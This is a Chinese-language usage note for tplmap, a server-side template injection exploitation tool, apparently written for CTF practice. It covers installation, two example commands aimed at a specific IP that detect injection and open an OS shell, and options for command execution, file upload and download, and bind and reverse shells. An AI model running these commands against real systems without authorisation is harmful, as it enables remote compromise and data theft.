

tplmap.py通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。
该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作。


linux下安装使用：
docker:未使用
kali安装:<https://www.cnblogs.com/ktsm/p/15691652.html>
```
安装
git clone https://github.com/epinna/tplmap  
cd tplmap  
sudo yum install python-pip -y||sudo apt install python-pip #安装py2的pip  

#或者用这个安装pip2
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2 get-pip.py
#升级
sudo pip2 install --upgrade pip 
#安装pip2扩展工具，不然后面安装还是报错 
sudo pip2 install --upgrade setuptools


sudo pip install -r requirements.txt  


操作：  
#探测注入点 
python2 tplmap.py -u 'http://114.67.175.244:10463/?flag'   
#获取shell 
python2 tplmap.py -u 'http://114.67.175.244:10463/?flag' --os-shell
```
使用参数
```
Usage: python tplmap.py [options]

选项:
  -h, --help          显示帮助并退出

目标:
  -u URL, --url=URL   目标 URL
  -X REQUEST, --re..  强制使用给定的HTTP方法 (e.g. PUT)

请求:
  -d DATA, --data=..  通过POST发送的数据字符串 
必须作为查询字符串: param1=value1&param2=value2
  -H HEADERS, --he..  附加标头 (e.g. 'Header1: Value1') 多次使用以添加新的标头
  -c COOKIES, --co..  Cookies (e.g. 'Field1=Value1') 多次使用以添加新的Cookie
  -A USER_AGENT, -..  HTTP User-Agent 标头的值
  --proxy=PROXY       使用代理连接到目标URL

检测:
  --level=LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)
  -e ENGINE, --eng..  强制将后端模板引擎设置为此值
  -t TECHNIQUE, --..  技术 R:渲染 T:基于时间的盲注 Default: RT

操作系统访问:
  --os-cmd=OS_CMD     执行操作系统命令
  --os-shell          提示交互式操作系统Shell
  --upload=UPLOAD     上传本地文件到远程主机
  --force-overwrite   上传时强制覆盖文件
  --download=DOWNL..  下载远程文件到本地主机
  --bind-shell=BIN..  在目标的TCP端口上生成系统Shell并连接到它
  --reverse-shell=..  运行系统Shell并反向连接到本地主机端口

模板检查:
  --tpl-shell         在模板引擎上提示交互式Shell
  --tpl-code=TPL_C..  在模板引擎中注入代码

常规:
  --force-level=FO..  强制将测试级别设置为此值
  --injection-tag=..  使用字符串作为注入标签 (default '*')

```